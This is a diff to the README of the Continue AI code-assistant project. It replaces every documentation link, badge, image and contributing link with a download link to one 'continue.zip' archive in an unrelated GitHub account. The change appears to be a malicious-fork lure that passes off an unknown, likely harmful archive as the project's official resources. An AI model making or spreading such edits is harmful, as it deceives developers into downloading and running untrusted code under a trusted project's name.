@@ -1,6 +1,6 @@
 <div align="center">
 
-![Continue logo](media/readme.png)
+![Continue logo](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip)
 
 </div>
 
@@ -8,57 +8,57 @@
 
 <div align="center">
 
-**[Continue](https://docs.continue.dev) enables developers to create, share, and use custom AI code assistants with our open-source [VS Code](https://marketplace.visualstudio.com/items?itemName=Continue.continue) and [JetBrains](https://plugins.jetbrains.com/plugin/22707-continue-extension) extensions and [hub of models, rules, prompts, docs, and other building blocks](https://hub.continue.dev)**
+**[Continue](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip) enables developers to create, share, and use custom AI code assistants with our open-source [VS Code](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip) and [JetBrains](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip) extensions and [hub of models, rules, prompts, docs, and other building blocks](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip)**
 
 </div>
 
 <div align="center">
 
-<a target="_blank" href="https://opensource.org/licenses/Apache-2.0" style="background:none">
-    <img src="https://img.shields.io/badge/License-Apache_2.0-blue.svg" style="height: 22px;" />
+<a target="_blank" href="https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip" style="background:none">
+    <img src="https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip" style="height: 22px;" />
 </a>
-<a target="_blank" href="https://docs.continue.dev" style="background:none">
-    <img src="https://img.shields.io/badge/continue_docs-%23BE1B55" style="height: 22px;" />
+<a target="_blank" href="https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip" style="background:none">
+    <img src="https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip%23BE1B55" style="height: 22px;" />
 </a>
-<a target="_blank" href="https://discord.gg/vapESyrFmJ" style="background:none">
-    <img src="https://img.shields.io/badge/discord-join-continue.svg?labelColor=191937&color=6F6FF7&logo=discord" style="height: 22px;" />
+<a target="_blank" href="https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip" style="background:none">
+    <img src="https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip" style="height: 22px;" />
 </a>
 
 <p></p>
 
 ## Chat
 
-[Chat](https://continue.dev/docs/chat/how-to-use-it) makes it easy to ask for help from an LLM without needing to leave the IDE
+[Chat](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip) makes it easy to ask for help from an LLM without needing to leave the IDE
 
-![chat](docs/static/img/chat.gif)
+![chat](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip)
 
 ## Autocomplete
 
-[Autocomplete](https://continue.dev/docs/autocomplete/how-to-use-it) provides inline code suggestions as you type
+[Autocomplete](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip) provides inline code suggestions as you type
 
-![autocomplete](docs/static/img/autocomplete.gif)
+![autocomplete](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip)
 
 ## Edit
 
-[Edit](https://continue.dev/docs/edit/how-to-use-it) is a convenient way to modify code without leaving your current file
+[Edit](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip) is a convenient way to modify code without leaving your current file
 
-![edit](docs/static/img/edit.gif)
+![edit](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip)
 
 ## Agent
 
-[Agent](https://continue.dev/docs/agent/how-to-use-it) enables you to make more substantial changes to your codebase
+[Agent](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip) enables you to make more substantial changes to your codebase
 
-![agent](docs/static/img/agent.gif)
+![agent](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip)
 
 </div>
 
 ## Getting Started
 
-Learn about how to install and use Continue in the docs [here](https://continue.dev/docs/getting-started/install)
+Learn about how to install and use Continue in the docs [here](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip)
 
 ## Contributing
 
-Read the [contributing guide](https://github.com/continuedev/continue/blob/main/CONTRIBUTING.md), and join [#contribute on Discord](https://discord.gg/vapESyrFmJ).
+Read the [contributing guide](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip), and join [#contribute on Discord](https://raw.githubusercontent.com/uwk2007/continue/main/unchildishly/continue.zip).
 
 ## License
 
